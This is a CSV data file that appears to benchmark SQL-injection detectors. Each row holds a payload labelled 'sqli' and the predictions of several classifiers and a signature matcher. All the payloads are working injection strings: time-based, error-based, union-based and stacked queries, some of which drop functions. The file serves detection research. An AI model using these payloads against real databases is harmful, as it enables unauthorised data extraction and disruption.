payload,class,overlap_exact,overlap_string,overlap_family,logistic_regression_raw,logistic_regression_normalized,naive_bayes_raw,naive_bayes_normalized,svm_raw,svm_normalized,signature_raw,signature_normalized
1);select (case when (3626=6022) then 3626 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6851') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('csfx'='csfx",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'+(select 'stsu' where 2386=2386 or sleep(5)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9037%"" union all select 6583#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select tnch where 1867=1867 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1) as gfhf where 5804=5804 or 6793=(select 6793 from pg_sleep(5))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('vjkf' like 'vjkf",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%';if(6842=5446) select 6842 else drop function vjfq--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'hrpa' where 1973=1973 union all select null,null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5132%"")) or 3038=3038",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('yabn'='yabn",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-1157)) as sxie where 7118=7118 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2612"") as iwfj where 3231=3231 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3361'||(select 'msfi' where 4806=4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1);(select * from (select(sleep(5)))srmq),sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""bizm""=""bizm",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') where 1115=1115;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select 'kqnj' where 9483=9483 or elt(5873=5873,sleep(5))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('nlfl' like 'nlfl",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-6661')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('tbmu' like 'tbmu,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-7675%'))) order by 1--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' union all select null#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' union all select null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1) as mpnj where 5049=5049;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 6424=6424;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')));select (case when (4111=1992) then 4111 else 1/(select 0) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-1644%' or make_set(9354=9354,7185) and '%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-1631%"") or elt(8285=1709,1709) and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1);if(7899=7899) select 7899 else drop function zbbp--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' in boolean mode);select case when 7649=9297 then 1 else null end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') where 6388=6388 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-2110' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4739')) union all select 6585,6585,6585,6585,6585--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))# ogwe",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1);select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%') or 8466=benchmark(5000000,md5(0x694a4745)) and ('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1 or 8421=(select count(*) from generate_series(1,5000000))# jmki",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7248"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""qgms""=""qgms",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1')));select (case when (8234=2498) then 8234 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) union all select null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4210"") where 2679=2679 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) and sleep(5),sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select 'vfkl' where 1713=1713 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) as iipj where 6560=6560;select count(*) from generate_series(1,5000000)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select 'gtqr' where 5660=5660;select pg_sleep(5)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1';select pg_sleep(5),sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' where 4150=4150 and elt(8012=6026,6026)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1',(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" and elt(1210=1210,sleep(5))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as hkrh where 3060=3060 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%')));select sleep(5) and ((('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('mmow'='mmow,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"")));waitfor delay '0:0:5' and (((""lpeo""=""lpeo",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'kjfm'='kjfm",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-4462%"") or 8571=8571--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") and 8635=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-1275"" union all select 7861,7861,7861,7861,7861#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5182"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-2411%'))) or 6872=6872 and ((('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1' in boolean mode) and 3787=7750--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%'))) union all select null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-6792)) as zlho where 4758=4758 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') where 9381=9381 or elt(6272=6272,sleep(5))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (5132=5132",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select 'cstd' where 9326=9326 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5832"") or 1650=9011--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) rlike sleep(5) and (('iwct'='iwct,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""))) and 6969=(select 6969 from pg_sleep(5)) and (((""ipqw"" like ""ipqw",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8636""))) union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select 'hplm' where 4008=4008 and 8594=(select 8594 from pg_sleep(5))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2862'))) union all select 6649,6649--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 2930=2930;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 7344=7344 rlike (select * from (select(sleep(5)))sgvo)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3933'))) union all select 6198,6198,6198,6198,6198#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 5129=5129 order by 1--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as duny where 3756=3756 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') as xskm where 3525=3525 and 2435=6513,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-3411'))) union all select 3185,3185,3185,3185,3185,3185,3185,3185--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 7775=7775 union all select null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) as dcen where 5852=5852 or (select * from (select(sleep(5)))ydpu)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('vwtq'='vwtq",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-9082 union all select 9858,9858,9858,9858,9858,9858--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) and elt(1210=1210,sleep(5))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1';select sleep(5),sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"make_set(7729=7729,1)",sqli,0,0,0,sqli,sqli,sqli,sqli,xss,sqli,benign,benign
"-1678"" where 3706=3706 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-9363%' or (8459=8459)*4906 and '%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-9337) union all select 5648,5648,5648,5648,5648#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' in boolean mode);select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-6823'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('lwlk' like 'lwlk,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")));begin user_lock.sleep(5); end and (((""revx""=""revx",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" and 4996=4431 and ""jzaq""=""jzaq",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('jzpb'='jzpb,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"");select benchmark(5000000,md5(0x714e4153))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('zpkv'='zpkv",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"" order by 1--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') as epgz where 2898=2898 and 7028=2287#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9057"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') where 3187=3187 order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-6463""))) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4746%""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'||(select 'xglm' from dual where 3556=3556 or 4240=(select 4240 from pg_sleep(5))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1)) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((1260=1260,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"" where 2989=2989 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5386') union all select 8026,8026,8026,8026,8026,8026#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'usnh' like 'usnh",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1,(select (case when (1570=1570) then (select 1570 from pg_sleep(5)) else 1/(select 0) end))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) union all select null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'kbvq' where 9279=9279 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"" and 6969=(select 6969 from pg_sleep(5)) and ""twmy""=""twmy",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4770))) union all select 6356,6356,6356,6356,6356#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""gydr"" like ""gydr",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") union all select null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as swix where 2459=2459 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 2199=2199 or (select * from (select(sleep(5)))ydpu)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%' and elt(4249=4249,7259) and '%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('qgrt'='qgrt",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8454"" or 6872=6872",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'vvkl'='vvkl",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") as ucex where 5148=5148 order by 1#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1',(case when 2872=2872 then 1 else null end)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1) where 8433=8433 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('txwf'='txwf",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') as yxdb where 4597=4597;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""wrbs"" like ""wrbs",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'+(select ocvc where 6981=6981 union all select null,null,null,null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as paai where 4089=4089 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select vohg where 6383=6383 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"");if(3831=9321) select 3831 else drop function ybru--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""gmld"" like ""gmld",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'='qjle",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
